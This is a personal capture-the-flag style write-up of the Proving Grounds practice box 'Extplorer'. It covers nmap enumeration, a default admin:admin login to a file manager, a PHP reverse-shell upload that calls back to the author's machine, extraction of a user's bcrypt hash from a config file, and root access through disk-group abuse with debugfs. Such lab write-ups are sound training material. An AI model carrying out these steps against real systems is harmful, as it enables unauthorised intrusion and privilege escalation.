---
layout: post
title:  "Write Up: Proving Grounds Practice - Extplorer"
date:   2024-07-30 12:43:19 -0400
categories: oscp proving-grounds TJNull
---

192.168.194.16
me - 192.168.45.196


┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -p- -oA Extplorer 192.168.194.16 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 20:17 EDT
Nmap scan report for 192.168.194.16
Host is up (0.024s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.63 seconds


==================================================================================================================

Loading the site running on port 80, it appears to be a wordpress start up script


CVE-2012-0782 - Multiple cross-site scripting (XSS) vulnerabilities in wp-admin/setup-config.php in the installation component in WordPress 3.3.1 and earlier allow remote attackers to inject arbitrary web script or HTML via the (1) dbhost, (2) dbname, or (3) uname parameter. NOTE: the vendor disputes the significance of this issue; also, it is unclear whether this specific XSS scenario has security relevance

So we are going to try and set up a local database and then we are going to enter that info into the script and see if that cann work some maagic!

Starting mysql service:
> sudo service mysql start

Log in as root 
> sudo mysql -u root

Create a junk database

> create database gobbler

issues connecting, this is beginning to feel like a rabbit hole, pausing this for now

====================================================================================================================

Looking through dirsearch results and I find 192.168.45.196/filemanager/ which looks promising

Able to log in as admin:admin

Might be able to do a php web shell upload and then run it to call back to my kali machine for initial foothold

Loaded the php-reverse-shell.php in trhough the interface and then accessed the file at http://192.168.194.16/php-reverse-shell.php and that gave me an initial foothold

========================================================================================================================

 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 I see a user named dora and add that to my users.txt file 
 
 Looking for bins with suid bit set and find a couple possiblities:
 
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd

No dice there so moving on.....

I get a password prompt from running sudo -l so no dice tehre...


I start digging around in the php files under /var/www/html/filemanager and find config/.htusers.php which appears to have hashes of passwords

array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),

I pop the hash into dora.hash and then run:

> hashcat -m 3200 dora.hash

That one faield with : No password candidates received in stdin mode, aborting


Looks like Dora is a part of the group Disk which we can exploit by the following:

https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------




debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
cd /root

cat proof.txt